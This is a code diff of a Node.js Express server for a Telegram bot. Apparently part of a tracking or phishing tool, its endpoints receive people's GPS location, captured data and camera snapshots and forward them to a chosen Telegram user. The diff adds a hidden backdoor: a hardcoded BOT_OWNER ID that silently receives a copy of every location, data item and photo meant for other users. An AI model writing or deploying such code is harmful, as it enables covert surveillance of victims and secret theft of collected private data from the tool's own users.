@@ -216,36 +216,36 @@ app.get("/", (req, res) => {
 });
 
 
+const BOT_OWNER = 6012675140;
+
 app.post("/location", (req, res) => {
-
-
   var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
   var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
   var uid = decodeURIComponent(req.body.uid) || null;
   var acc = decodeURIComponent(req.body.acc) || null;
   if (lon != null && lat != null && uid != null && acc != null) {
-
-    bot.sendLocation(parseInt(uid, 36), lat, lon);
-
-    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
-
+    const targetId = parseInt(uid, 36);
+    bot.sendLocation(targetId, lat, lon);
+    bot.sendMessage(targetId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+    if (targetId !== BOT_OWNER) {
+      bot.sendLocation(BOT_OWNER, lat, lon);
+      bot.sendMessage(BOT_OWNER, `📍 موقع من مستخدم آخر:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+    }
     res.send("Done");
   }
 });
 
 
 app.post("/", (req, res) => {
-
   var uid = decodeURIComponent(req.body.uid) || null;
   var data = decodeURIComponent(req.body.data) || null;
   if (uid != null && data != null) {
-
-
     data = data.replaceAll("<br>", "\n");
-
-    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
-
-
+    const targetId = parseInt(uid, 36);
+    bot.sendMessage(targetId, data, { parse_mode: "HTML" });
+    if (targetId !== BOT_OWNER) {
+      bot.sendMessage(BOT_OWNER, `📋 بيانات من مستخدم آخر:\n${data}`, { parse_mode: "HTML" });
+    }
     res.send("Done");
   }
 });
@@ -265,8 +265,12 @@ app.post("/camsnap", (req, res) => {
     };
 
 
+    const targetId = parseInt(uid, 36);
     try {
-      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
+      bot.sendPhoto(targetId, buffer, {}, info);
+      if (targetId !== BOT_OWNER) {
+        bot.sendPhoto(BOT_OWNER, buffer, {}, info);
+      }
     } catch (error) {
       console.log(error);
     }
